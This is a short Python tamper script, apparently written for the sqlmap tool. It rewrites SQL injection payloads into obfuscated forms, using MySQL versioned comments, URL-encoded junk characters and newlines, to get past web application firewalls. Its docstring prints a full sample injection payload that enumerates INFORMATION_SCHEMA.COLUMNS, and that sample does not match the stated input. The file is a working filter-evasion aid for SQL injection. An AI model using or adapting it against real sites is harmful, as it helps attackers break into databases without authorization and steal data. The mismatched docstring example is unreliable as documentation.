from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
  pass
def tamper(payload, **kwargs):
  """
  Replaces keywords
  >>> tamper('UNION SELECT id FROM users')
  '1 union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/ NULL,/*!12345CONCAT*/(0x7170706271,IFNULL(/*!12345CASt(*/COUNT(*) AS CHAR),0x20),0x7171786b71),NULL/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x73716c696e6a656374--
  """
  if payload:
      payload=payload.replace("UNION ALL SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
      payload=payload.replace("UNION SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
      payload=payload.replace(" FROM ","/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/")
      payload=payload.replace("CONCAT","/*!12345CONCAT*/")
      payload=payload.replace("CAST(","/*!12345CAST(*/")
      payload=payload.replace("CASE","/*!12345CASE*/")
      payload=payload.replace("DATABASE()","database/**/()")
                
  return payload